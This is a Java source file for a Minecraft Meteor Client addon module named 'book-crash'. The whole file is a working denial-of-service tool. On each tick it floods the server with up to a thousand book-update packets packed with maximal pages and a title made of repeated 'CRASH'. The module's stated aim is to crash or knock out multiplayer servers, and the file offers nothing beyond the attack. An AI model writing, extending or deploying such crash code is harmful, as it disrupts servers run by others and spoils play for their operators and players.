package widecat.meteorcrashaddon.modules;

import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.BookUpdateC2SPacket;
import widecat.meteorcrashaddon.CrashAddon;

import java.util.ArrayList;
import java.util.List;
import java.util.Optional;

public class BookCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
        .name("amount").description("Packets per tick.").defaultValue(100).min(1).sliderMax(1000).build());

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disables on kick.").defaultValue(true).build());

    public BookCrash() {
        super(CrashAddon.CATEGORY, "book-crash", "Spams book update packets using new Data Components.");
    }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        if (mc.player == null) return;

        List<String> pages = new ArrayList<>();
        for (int i = 0; i < 50; i++) {
            pages.add("X".repeat(256)); // Maximize page size
        }

        String title = "CRASH".repeat(10); // Maximize title

        for (int i = 0; i < amount.get(); i++) {
            mc.getNetworkHandler().sendPacket(new BookUpdateC2SPacket(
                0, pages, Optional.of(title)
            ));
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get()) toggle();
    }
}